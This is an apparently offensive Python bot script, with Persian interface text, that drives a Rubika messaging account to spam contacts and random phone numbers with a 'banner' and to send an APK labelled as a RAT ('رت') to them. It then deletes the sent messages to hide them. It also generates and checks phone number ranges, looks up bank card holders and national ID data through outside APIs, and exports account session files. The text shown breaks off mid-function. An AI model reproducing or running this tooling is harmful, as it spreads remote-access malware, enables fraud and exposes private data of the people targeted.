from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup , InlineQueryResultArticle, InputTextMessageContent , CallbackQuery
from pyrogram.types.bots_and_keyboards import force_reply 
from pyrogram import Client,types,filters
import os
import subprocess
import rubpy
import random, string
import shutil
from asyncio import sleep
import platform
import glob
import time
import requests
import json
import re

def NewAl(num, num2,num3):
    random_numbers = [str(num) + ''.join([str(random.randint(0, 9)) for _ in range(num3)]) for _ in range(num2)]
    return '\n'.join(random_numbers)
def Persian():
    persian_alphabet = ''
    random_letters = ''.join(random.choice(persian_alphabet) for _ in range(5))
    return random_letters

database= {'SLEEPTIME': 1, 'BANNER' : None, 'LINK' : None}

START=InlineKeyboardMarkup([
[InlineKeyboardButton("✅ اضافه کردن اکانت ✅" , "Addaccount") , InlineKeyboardButton("⚠️ حذف اکانت ⚠️" , "DeleteAccount")],
[InlineKeyboardButton("📥 اضافه کردن سشن 📥" , "AddSession"),InlineKeyboardButton("📥 دریافت سشن اکانت 📥" , "DownloadSession")],
[InlineKeyboardButton("👥 ساخت گروه 👥" , "CreateGroup") ,InlineKeyboardButton("📝 ادیت پروفایل 📝" , "Profile")],
[InlineKeyboardButton("🔥ارسال به چت‌ها‌و‌مخاطبین🔥" , "AllSender") , InlineKeyboardButton("🔥 ارسال به شماره دلخواه 🔥" , "NumbersSender")],
[InlineKeyboardButton("📨 ارسال به پیوی ها 📨" , "ChatsSender") , InlineKeyboardButton("📨 ارسال به مخاطبین 📨" , "ContactsSender")],
[InlineKeyboardButton("💠 ساخت شماره 💠" , "NumberCreator") , InlineKeyboardButton("☎️ شماره چکر ☎️" , "NumberLicher")],
[InlineKeyboardButton("🔢 ساخت شماره به رنج دلخواه🔢" , "kos")] ,
[InlineKeyboardButton("🧩 اضافه کردن مخاطب 🧩" , "AddContact") , InlineKeyboardButton("📛 حذف مخاطبین 📛" , "DeleteContacts")],
[InlineKeyboardButton("📱ارسال رت به مخاطبین📱" , "ApkContacts") , InlineKeyboardButton("📱ارسال رت به شماره‌دلخواه📱" , "ApkNumbers")],
[InlineKeyboardButton("⏳ تنظیم تایم⏳" , "time"), InlineKeyboardButton("⚙ تنظیم بنر ⚙" , "banner")],
#[InlineKeyboardButton("تنظیم درگاه" , "LINK")],
])
namebio=InlineKeyboardMarkup([
[InlineKeyboardButton("اسم" , "FirstName") , InlineKeyboardButton("Last Name" , "LastName")],
[InlineKeyboardButton("بیو" , "Bio")],
])
cancell=ReplyKeyboardMarkup([['/cancell']],resize_keyboard =True)
wait=ReplyKeyboardMarkup([['منتظر باش دلقک']],resize_keyboard =True)
yesno=ReplyKeyboardMarkup([
['Yes','No'],
],resize_keyboard =True)

def randomword(length=5):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
    
    
def lichNumber(num):
    return "\n".join([num + str(random.randint(1000000, 9999999)) for i in range(10000)])
  
proxy = None
Owner=[] # ایدی عددی بزار
token="توکن بزار"

Bot=Client("CreateBot",api_id=15567484,in_memory=True,api_hash="9cee14fbc3ea1fefd4bbb4fd4e2daa6d",bot_token=token,proxy=proxy)

      
        
@Bot.on_callback_query(filters.user(Owner) & filters.regex("ApkNumbers"))
async def getpjdgsjshdhddhhdsendxone(Event:types.Message,Call:CallbackQuery):
    NumbersSender=await Bot.ask(chat_id=Call.message.chat.id,text="""لیست شماره خود را ارسال کنید یا /cancell""",reply_markup=cancell)
    if NumbersSender.text=="/cancell":
        await Call.message.reply("عملیات کنسل شد",reply_markup=START)
    else:
        #one_text=await Bot.ask(chat_id=Call.message.chat.id,text="بنرت رو ارسال کن یا /cancell",reply_markup=cancell)
        #one_text="y"
        if database['BANNER'] == None:
            await Call.message.reply("بنرت رو ست کن",reply_markup=START)
        else:
            one_text=str(database['BANNER'])
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")            
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            c=0
            async with rubpy.Client(name) as app:        
                lines = NumbersSender.text.splitlines()
                number_of_lines = len(lines)
                try:
                    for number in NumbersSender.text.split('\n'):
                        number = number.replace("0", "", 1)
                        try:
                            data=await app(rubpy.methods.contacts.AddAddressBook(number, "کیک خور", ""))
                            if data.user:    
                                guid=data.user.user_guid           
                                try:                 
                                    x=await app.send_message(guid, str(Persian()))
                                    await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))     
                                    await rubpy.Client.send_document(app,guid, 'downloads/app.apk')
                                    c+=1
                                    print("🍓")
                                except Exception as e:
                                    Call.message.reply(e)
                                    print(e)
                                try:
                                    user = await app.get_user_info(guid)
                                    await app.delete_user_chat(guid, user.last_message_id)  
                                    print("💰")
                                except Exception as e:
                                    print(e)
                                  
                                await idd.edit(f"""📊 تعداد کل شمار ها : {number_of_lines}\n🔖 تعداد بنر های ارسال شده به شماره های ورودی‌: {c}""")
                                             
                        except:pass
                    await Call.message.reply("عملیات با موفقیت تمام شد",reply_markup=START)
                except Exception as e:
                    print(e)
                    await Call.message.reply("❌ مشکل وجود دارد",reply_markup=START)
                
                
@Bot.on_message(filters.command('split') , group=-1)
async def Split_duc(Bot,message):
    try:
        amount = int(300)
        end = int(str(message.command[1]))
        x=await message.reply_to_message.download(file_name = f'List_929292929.txt')
        y=''
        count=0
        with open(x , 'r') as f:
            all=f.read().split('\n')
            
            for i in all:
                y+=f'{i} \n'
                
                if len(y.split('\n')) >= amount : 
                    await message.reply_text(y)
                    count+=1
                    y=''                                        
                if count >= end : return               
        if y != '' : 
            await message.reply_text(y)
            
    except Exception as e:
        print(e)
    remove(x)
    
@Bot.on_message(filters.user(Owner) & filters.command("start") )
async def start(_:Bot,Event:types.Message):
    try:
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = "./"+name 
        async with rubpy.Client(name) as app:   
            print(name)
            info=await app.get_me()
            await Event.reply("صبر کن دارم اطلاعات اکانت رو میگیرم...")
            try:
                first_name = info.user.first_name
              #  last_name = info.user.last_name
                phone = info.user.phone
                username = info.user.username
            except:pass
            contacts_list = []
            start_id = None
            try:
                while True:
                    contacts = await app.get_contacts(start_id=start_id)
                    for user in contacts['users']:
                        contacts_list.append(user['user_guid'])
                    if not contacts.next_start_id:
                        break
                    #print(len(contacts_list))
                    start_id = contacts.next_start_id
            except:pass
            chats_list = []
            start_id = None
            try:
                while True:
                    contacts = await app.get_chats(start_id=start_id)
                    for user in contacts['chats']:
                        if user['abs_object']['type'] == 'User':
                            chats_list.append(user['object_guid'])
                    if not contacts.next_start_id:
                        break
                    #print(len(contacts_list))
                    start_id = contacts.next_start_id
            except:pass
            N=len(contacts_list)
            NCHAT = len(chats_list)
            user_guid = info.user.user_guid
            await Event.reply(f"""├ • Account information
├ •
├ • Name : {first_name}
├ • Number :{phone}
├ • Username : {username}
├ • Chats : {NCHAT}
├ • Contacts : {N}
├ • Guid : {user_guid}
├ • ┅┅━━━━━━━━━━━━━┅┅ •
├ • Sleep Time : {database['SLEEPTIME']}
├ • Banner : (\n{database['BANNER']} )
├ • ┅┅━━━━━━━━━━━━━┅┅ •
برای سیو رت کافیه فقط رت رو بفرستی خودکار سیو میشه
├ • ┅┅━━━━━━━━━━━━━┅┅ •
├ • Channel : @CYROSIF""",reply_markup=START)
    except Exception as e:
        print(e)
        await Event.reply(f"""سلام دلقک اکانتتو اد کن 
        
⏳ Sleep Time - > {database['SLEEPTIME']}
🔗 Banner : ( 
{database['BANNER']} 
)
        -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
برای سیو رت کافیه فقط رت رو بفرستی خودکار سیو میشه

Channel : @CYROSIF""",reply_markup=START)

@Bot.on_callback_query(filters.user(Owner) & filters.regex("Profile"))
async def Profile(_:Bot,Event:CallbackQuery):
    await Event.message.reply("""انتخاب کن کدومو میخای ادیت کنی دلقک""",reply_markup=namebio)
    
@Bot.on_callback_query(filters.user(Owner) & filters.regex("FirstName"))
async def getpjdjdhohhntse(Event:types.Message,Call:CallbackQuery):
    FirstName=await Bot.ask(chat_id=Call.message.chat.id,text="ـ firstname مورد نظر خود را ارسال کنید تا ادیت کنم یا  /cancell",reply_markup=cancell)
    if FirstName.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:       
        await Call.message.reply(".",reply_markup=wait)
        idd=await Call.message.reply("Wait...")            
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = "./"+name 
        c=0
        async with rubpy.Client(name) as app:                        
            try:
                await rubpy.Client.update_profile(app,first_name=f'{FirstName.text}')
                await Call.message.reply("اسم اکانت با موفقیت ادیت شد",reply_markup=START)
            except Exception as e:
                print(e)
                await Call.message.reply("❌ مشکل وجود دارد",reply_markup=START)
        
@Bot.on_callback_query(filters.user(Owner) & filters.regex("time"))
async def getpjdjdhohhntse(Event:types.Message,Call:CallbackQuery):

    time=await Bot.ask(chat_id=Call.message.chat.id,text="""تو این بخش میتونی تنظیم کنی هر چند ثانیه پیوی یک نفر بره
فقط کافیه عدد مورد نظر رو ارسال کنی یا برای لغو /cancell رو بفرستی

-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
مثال: تنظیم کردی رو 2 ثانیه

هر 2 ثانیه متن به پیوی یک مخاطب ارسال میشه
هرچی این تایم بیشتر باشه امکان ریپ شدن اکانت کمتره""",reply_markup=cancell)
    if time.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:      
        database['SLEEPTIME'] = time.text
        await Call.message.reply(f"با موفقیت تنظیم شد , Time : {time.text}",reply_markup=START)
    
@Bot.on_callback_query(filters.user(Owner) & filters.regex("banner"))
async def getpjdjdhohhntse(Event:types.Message,Call:CallbackQuery):

    time=await Bot.ask(chat_id=Call.message.chat.id,text="""بنرت رو ارسال کن یا برای لغو عملیات /cancell""",reply_markup=cancell)
    if time.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:      
        database['BANNER'] = time.text
        await Call.message.reply(f"با موفقیت تنظیم شد , \nBanner :\n {time.text}",reply_markup=START)
    
@Bot.on_callback_query(filters.user(Owner) & filters.regex("LINK"))
async def getpjdjdhohhndiditse(Event:types.Message,Call:CallbackQuery):

    time=await Bot.ask(chat_id=Call.message.chat.id,text="""لینک درگاه رو بده یا لغو عملیات /cancell""",reply_markup=cancell)
    if time.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:      
        database['LINK'] = time.text
        await Call.message.reply(f"با موفقیت تنظیم شد , \nLINK :\n {time.text}",reply_markup=START)
    
@Bot.on_callback_query(filters.user(Owner) & filters.regex("LastName"))
async def getpjdjdhohhoone(Event:types.Message,Call:CallbackQuery):
    LastName=await Bot.ask(chat_id=Call.message.chat.id,text="ـ LastName مورد نظر خود را ارسال کنید تا ادیت کنم یا  /cancell",reply_markup=cancell)
    if LastName.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:       
        await Call.message.reply(".",reply_markup=wait)
        idd=await Call.message.reply("Wait...")            
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = "./"+name 
        c=0
        async with rubpy.Client(name) as app:                        
            try:
                await rubpy.Client.update_profile(app,last_name=f'{LastName.text}')
                await Call.message.reply("ـ LastName اکانت با موفقیت ادیت شد",reply_markup=START)
            except Exception as e:
                print(e)
                await Call.message.reply("❌ مشکل وجود دارد",reply_markup=START)
        
@Bot.on_callback_query(filters.user(Owner) & filters.regex("Bio"))
async def getpjdjdhoyyyyhhne(Event:types.Message,Call:CallbackQuery):
    Bio=await Bot.ask(chat_id=Call.message.chat.id,text="ـ بیو مورد نظر خود را ارسال کنید تا ادیت کنم یا  /cancell",reply_markup=cancell)
    if Bio.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:       
        await Call.message.reply(".",reply_markup=wait)
        idd=await Call.message.reply("Wait...")            
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = "./"+name 
        c=0
        async with rubpy.Client(name) as app:                        
            try:
                await rubpy.Client.update_profile(app,bio=f'{Bio.text}')
                await Call.message.reply("بیو اکانت با موفقیت ادیت شد",reply_markup=START)
            except Exception as e:
                print(e)
                await Call.message.reply("❌ مشکل وجود دارد",reply_markup=START)
        
            
            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("^DownloadSession"))
async def hdhgxgxgdhdgdg(Event:types.Message,Call:CallbackQuery):
    await Event.message.reply("""Wait....""",reply_markup=wait)
    try:
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = f"{name}.rbs"       
        await Event.message.reply_document(f'{name}',reply_markup=START) 
    except Exception as e:
        await Event.message.reply("""سشنی وجود ندارد""",reply_markup=START)    
   
@Bot.on_callback_query(filters.user(Owner) & filters.regex("^kos"))
async def hdhdgdh(Event:types.Message,Call:CallbackQuery):
    add=await Bot.ask(chat_id=Call.message.chat.id,text="""شماره ای که میخوای ساخته شه رو وارد کن بقیشو من میسازم برات 

مثال
09
0992
0921121
091919172
بقیش با من 

یا /cancell""",reply_markup=cancell)
    print(add.text)
    addu = add.text
    adds = len(add.text)
    if adds < 11:
        await Call.message.reply("wait....",reply_markup=wait)
        if os.path.exists("test.txt"):
            os.remove('test.txt')
        with open('test.txt', 'a+') as f:
            Al= 11 - adds
            X2=NewAl(addu,4000,Al)
            f.write(X2)
        letters = 'abcdefghijklmnopqrstuvwxyz'
        random_letters = random.choices(letters, k=10)
        random_word = ''.join(random_letters)
        id=await Call.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
        await id.reply(f"""/split 1""")
        os.remove('test.txt')

@Bot.on_callback_query(filters.user(Owner) & filters.regex("^shcard"))
async def hdhdjdjsgtttdh(Event:types.Message,Call:CallbackQuery):
    add=await Bot.ask(chat_id=Call.message.chat.id,text="""شماره کارت رو بفرست یا /cancell""",reply_markup=cancell)
    await Call.message.reply("""Wait....""",reply_markup=wait)
    url = f"https://sidepath.ir/api/cart-to-shaba-hesab.php?license=@SidePath&url={add.text}"

    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()["Results"]
        iban_number = data["iban_number"]
        deposits = data["deposits"]
        first_name = data["first_name"]
        last_name = data["last_name"]
        bank_id = data["Bank-Id"]
        await Call.message.reply(f"""├ • Card number information
├ •
├ • Name : {first_name}
├ • Lastname : {last_name}
├ • Shaba : {iban_number}
├ • Bank : {bank_id}
├ • Card : {add.text}
├ • Wallet : {deposits}
├ •
├ • ┅┅━━━━━━━━━━━━━┅┅ •
├ • Channel : @CYROSIF""")

@Bot.on_callback_query(filters.user(Owner) & filters.regex("^codmeli"))
async def hdhdjdjsgtttdyyyh(Event:types.Message,Call:CallbackQuery):
    add=await Bot.ask(chat_id=Call.message.chat.id,text="""کد ملی رو بفرست یا /cancell""",reply_markup=cancell)
    await Call.message.reply("""Wait....""",reply_markup=wait)
    url = f"https://haji-api.ir/estelam/codemeli?text=@SidePath&url={add.text}"

    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        city = data['result']['city']
        await Call.message.reply(f"""├ • Card number information
├ •
├ • Codemeli : {add.text}
├ • City : {city}
├ •
├ • ┅┅━━━━━━━━━━━━━┅┅ •
├ • Channel : @CYROSIF""")

@Bot.on_callback_query(filters.user(Owner) & filters.regex("^NumberCreator"))
async def hdhdgdh(_:Bot,Event:CallbackQuery):
    await Event.message.reply("""Wait....""",reply_markup=wait)
    if os.path.exists("test.txt"):
        os.remove('test.txt')
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0910")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 910\n🛑 : 10K""")
    os.remove('test.txt')
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0911")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 911\n🛑 : 10K""")
    os.remove('test.txt')
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0912")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 912\n🛑 : 10K""")
    os.remove('test.txt')
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0913")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 913\n🛑 : 10K""")
    os.remove('test.txt')
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0914")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 914\n🛑 : 10K""")
    os.remove('test.txt')
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0915")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 915\n🛑 : 10K""")
    os.remove('test.txt')   
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0916")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 916\n🛑 : 10K""")
    os.remove('test.txt')   
    with open('test.txt', 'a+') as f:
        X2=lichNumber("0917")    
        f.write(X2)
    letters = 'abcdefghijklmnopqrstuvwxyz'
    random_letters = random.choices(letters, k=10)
    random_word = ''.join(random_letters)
    await Event.message.reply_document(r'test.txt' , file_name  = f"{random_word}.txt")    
    await Event.message.reply("""From 917\n🛑 : 10K""")
    os.remove('test.txt')
    await Event.message.reply("""From 910,...,917\n🛑 : 40K""",reply_markup=START)
    
    
@Bot.on_callback_query(filters.user(Owner) & filters.regex("ChatsSender"))
async def sendhshsall(Event:types.Message,Call:CallbackQuery):
    #print(CallbackQuery)
    if database['BANNER'] == None:
        await Call.message.reply("بنرت رو ست کن",reply_markup=START)
    else:
        #two_text=await Bot.ask(chat_id=Call.message.chat.id,text="بنرت رو ارسال کن یا /cancell",reply_markup=cancell)        
        two_text="y"
        if two_text=="/cancell":
            await Call.message.reply("cancell Ok",reply_markup=START)
        else:
            one_text=str(database['BANNER'])
            #two_text=str(two_text.text)
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            async with rubpy.Client(name) as app:                
                npv=0
                chats_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_chats(start_id=start_id)
                        
                        for user in contacts['chats']:
                            if user['abs_object']['type'] == 'User':
                                
                                chats_list.append(user['object_guid'])
                        if not contacts.next_start_id:
                            break
                    #print(len(contacts_list))
                        start_id = contacts.next_start_id
                except:pass
            
                NCHAT = len(chats_list)
                await Call.message.reply(f"""تعداد {NCHAT} پیوی پیدا شد""")                
                for guid in chats_list:
                    try:
                        #await sleep(2)
                        x=await app.send_message(guid, str(Persian()))
                        await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))     
                        #await app.send_message(guid, two_text)
                        user = await app.get_user_info(guid)
                        await app.delete_user_chat(guid, user.last_message_id)
                        npv+=1
                        await idd.edit(f"""🔖 تعداد بنر های ارسال شده به (پیوی ها) : {npv}""")     
                        await sleep(int(database['SLEEPTIME']))

                    except Exception as e:
                        print(e)
            await Call.message.reply(f'''عملیات تمام شد✅''',reply_markup=START)

            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("AllSender") )
async def sendaljsjsl(Event:types.Message,Call:CallbackQuery):

    if database['BANNER'] == None:
        await Call.message.reply("بنرت رو ست کن",reply_markup=START)
    else:
        #two_text=await Bot.ask(chat_id=Call.message.chat.id,text="بنرت رو ارسال کن یا /cancell",reply_markup=cancell)        
        two_text="y"
        if two_text=="/cancell":
            await Call.message.reply("cancell Ok",reply_markup=START)
        else:
            one_text=str(database['BANNER'])
            #two_text=str(two_text.text)
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            async with rubpy.Client(name) as app:                
                npv=0
                contacts_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_contacts(start_id=start_id)
                        for user in contacts['users']:
                            if time.time() - user['last_online'] <= 259200:
                                contacts_list.append(user['user_guid'])
                        if not contacts.next_start_id:
                            break
                    #print(len(contacts_list))
                        start_id = contacts.next_start_id
                except:pass
                chats_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_chats(start_id=start_id)
                        for user in contacts['chats']:
                            if user['abs_object']['type'] == 'User':
                                chats_list.append(user['object_guid'])
                        if not contacts.next_start_id:
                            break
                    #print(len(contacts_list))
                        start_id = contacts.next_start_id
                except:pass
                all =contacts_list + chats_list
                NCHAT = len(all)
                await Call.message.reply(f"""تعداد {NCHAT} پیوی و مخاطب پیدا شد""")                
                for guid in all:
                    try:
                       # await sleep(2)
                        x=await app.send_message(guid, str(Persian()))
                        await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))
                        #await app.send_message(guid, two_text)
                        user = await app.get_user_info(guid)
                        await app.delete_user_chat(guid, user.last_message_id)                        
                        npv+=1
                        print(npv)
                        await idd.edit(f"""🔖 تعداد بنر های ارسال شده به (پیوی ها و مخاطبین) : {npv}""")     
                        await sleep(int(database['SLEEPTIME']))
                    except Exception as e:
                        
                        print(e)
            await Call.message.reply(f'''عملیات تمام شد✅''',reply_markup=START)
            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("ContactsSender") )
async def sendallhshs(Event:types.Message,Call:CallbackQuery):

    if database['BANNER'] == None:
        await Call.message.reply("بنرت رو ست کن",reply_markup=START)
    else:
        #two_text=await Bot.ask(chat_id=Call.message.chat.id,text="بنرت رو ارسال کن یا /cancell",reply_markup=cancell)        
        two_text="y"
        if two_text=="/cancell":
            await Call.message.reply("cancell Ok",reply_markup=START)
        else:
           
            one_text=database['BANNER']
            #one_text = one_text.replace("LINK", f'[Dar]({text})')
            one_text = str(one_text)
            #two_text=str(two_text.text)
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            async with rubpy.Client(name) as app:                
                npv=0
                X=0
                gh=0
                contacts_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_contacts(start_id=start_id)
                        for user in contacts['users']:
                            if time.time() - user['last_online'] <= 259200:
                                contacts_list.append(user['user_guid'])
                        if not contacts.next_start_id:
                            break
                        
                        start_id = contacts.next_start_id
                except:pass
                N=len(contacts_list)
                await Call.message.reply(f"""تعداد {N} مخاطب با لست سین زیر 3 روز پیدا شد """)
                for guid in contacts_list:
                    try:
                        if X <999:
                            await sleep(int(database['SLEEPTIME']))
                            
                            X+=1
                            PH= await app(rubpy.methods.users.GetUserInfo(guid))
                            PHONE= PH.user.phone
                            one_textt = one_text.replace("PHONE", f"{PHONE}")
                            
                            x=await app.send_message(guid, str(Persian()))
                            
                            await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))                            
                            #await app.send_message(guid, two_text)
                            
                            user = await app.get_user_info(guid)
                            await app.delete_user_chat(guid, user.last_message_id)
                            npv+=1
                            await idd.edit(f"""🔖 تعداد بنر های ارسال شده به (مخاطبین) : {npv}""")     
                            await sleep(int(database['SLEEPTIME']))

                           #await app.send_message(guid, two_text)  
                    except:pass
                        
                
            await Call.message.reply(f'''عملیات تمام شد✅''',reply_markup=START)

@Bot.on_callback_query(filters.user(Owner) & filters.regex("ApkContacts") )
async def sendallhshs(Event:types.Message,Call:CallbackQuery):

    if database['BANNER'] == None:
        await Call.message.reply("بنرت رو ست کن",reply_markup=START)
    else:
        #two_text=await Bot.ask(chat_id=Call.message.chat.id,text="بنرت رو ارسال کن یا /cancell",reply_markup=cancell)        
        two_text="y"
        if two_text=="/cancell":
            await Call.message.reply("cancell Ok",reply_markup=START)
        else:
            one_text=str(database['BANNER'])
           # two_text=str(two_text.text)
            await Call.message.reply(".",reply_markup=wait)
            idd=await Call.message.reply("Wait...")
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            async with rubpy.Client(name) as app:                
                npv=0
                X=0
                gh=0
                contacts_list = []
                start_id = None
                try:
                    while True:
                        contacts = await app.get_contacts(start_id=start_id)
                        for user in contacts['users']:
                            if time.time() - user['last_online'] <= 259200:
                                contacts_list.append(user['user_guid'])
                        if not contacts.next_start_id:
                            break
                        
                        start_id = contacts.next_start_id
                except:pass
                N=len(contacts_list)
                await Call.message.reply(f"""تعداد {N} مخاطب با لست سین زیر 3 روز پیدا شد """)

                for guid in contacts_list:
                    try:
                        if X <999:
                            
                            
                            await rubpy.Client.send_document(app,guid, 'downloads/app.apk')
                            x=await app.send_message(guid, str(Persian()))
                            X+=1
                            await app(rubpy.methods.messages.EditMessage(guid, x.message_update.message_id, str(database['BANNER'])))     
                            user = await app.get_user_info(guid)
                            await app.delete_user_chat(guid, user.last_message_id)      
                            npv+=1                    
                            await idd.edit(f"""🔖 تعداد بنر های ارسال شده به (مخاطبین) : {npv}""")     

                           #await app.send_message(guid, two_text)  
                    except:pass
                
            await Call.message.reply(f'''عملیات تمام شد✅''',reply_markup=START)
            
@Bot.on_callback_query(filters.user(Owner) & filters.regex("NumberLicher") )
async def newgysssg(Event:types.Message,Call:CallbackQuery):
    num=await Bot.ask(chat_id=Call.message.chat.id,text="لیست شماره هاتو بفرست یا /cancell",reply_markup=cancell)
    if num.text=="/cancell":
        await Call.message.reply("cancell Ok",reply_markup=START)
    else:        
        await Call.message.reply(".",reply_markup=wait)
        idd=await Call.message.reply("Wait...")
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = "./"+name 
        async with rubpy.Client(name) as app:        
            x = ""
            n=0
            all=0
            allMO=0
            oo=0
            lines = num.text.splitlines()
            number_of_lines = len(lines)
            for number in num.text.split('\n'):
                number = number.replace("0", "", 1)
                
                try:
                    all +=1
                    data=await app(rubpy.methods.contacts.AddAddressBook(number, "کیک", ""))
                    if data.user:    
                        try:
                            allMO +=1
                            GG= 30 - n
                            await idd.edit(f"""📊 تعداد کل شمار ها : {number_of_lines}\n🔖 تعداد شماره های چک شده : {all}\n🔖 تعداد شماره های موجود در روبیکا : {allMO}\n🔖 تعداد شماره های موجود و لست سین زیر 1 ساعت : {oo}\n🔖 {GG} تعداد شماره مانده تا لیست ارسال شود.""")
                            if time.time() - data.user.last_online <= 3600:
                                oo +=1
                                n +=1
                                x +=f"0{number}\n"                               
                                if n >= 30:
                                    await Call.message.reply(x)
                                    n=0
                                    x=""       
                                                       
                        except Exception as e:
                            print(f"An error occurred: {e}")
                except:pass
            if n > 0:
                await Call.message.reply(x)
        await Call.message.reply("عملیات با موفقیت تمام شد",reply_markup=START)
    
@Bot.on_callback_query(filters.user(Owner) & filters.regex("AddContact"))
async def getpjdgsjdhhxone(Event:types.Message,Call:CallbackQuery):
    AddContact=await Bot.ask(chat_id=Call.message.chat.id,text="""لیست شماره خود را ارسال کنید یا /cancell""",reply_markup=cancell)
    if AddContact.text=="/cancell":
        await Call.message.reply("عملیات کنسل شد",reply_markup=START)
    else:   
        await Call.message.reply(".",reply_markup=wait)
        idd=await Call.message.reply("Wait...")            
        name = [i for i in glob.glob("*.rbs")][0]
        name = name.replace(".rbs","")
        name = "./"+name 
        c=0
        async with rubpy.Client(name) as app:        
            lines = AddContact.text.splitlines()
            number_of_lines = len(lines)
            try:
                for number in AddContact.text.split('\n'):
                    number = number.replace("0", "", 1)
                    try:
                        data=await app(rubpy.methods.contacts.AddAddressBook(number, "کیک خور", ""))
                        c+=1
                        await idd.edit(f"""📊 تعداد کل شمار ها : {number_of_lines}
🔖 تعداد مخاطبین اضافه شده : {c}""")
                    except:pass
                await Call.message.reply("عملیات با موفقیت تمام شد",reply_markup=START)
            except Exception as e:
                print(e)
                await Call.message.reply("❌ مشکل وجود دارد",reply_markup=START)
            
            

@Bot.on_callback_query(filters.user(Owner) & filters.regex("CreateGroup") )
async def senyydhsTzgsall(Event:types.Message,Call:CallbackQuery):
    if database['BANNER'] == None:
        await Call.message.reply("بنرت رو ست کن",reply_markup=START)
    else:
        groupname=await Bot.ask(chat_id=Call.message.chat.id,text="اسم گروه رو وارد کن یا /cancell",reply_markup=cancell)        
        if groupname.text=="/cancell":
            await Call.message.reply("cancell Ok",reply_markup=START)
        else:
            one_text=str(database['BANNER'])
            groupname=str(groupname.text)
            idd=await Call.message.reply("Wait...")
            name = [i for i in glob.glob("*.rbs")][0]
            name = name.replace(".rbs","")
            name = "./"+name 
            async with rubpy.Client(name) as app:                
                ngap=0
                npv=0
                ncontact=0
                contacts = await app.get_contacts()
                list = []
                num = 0
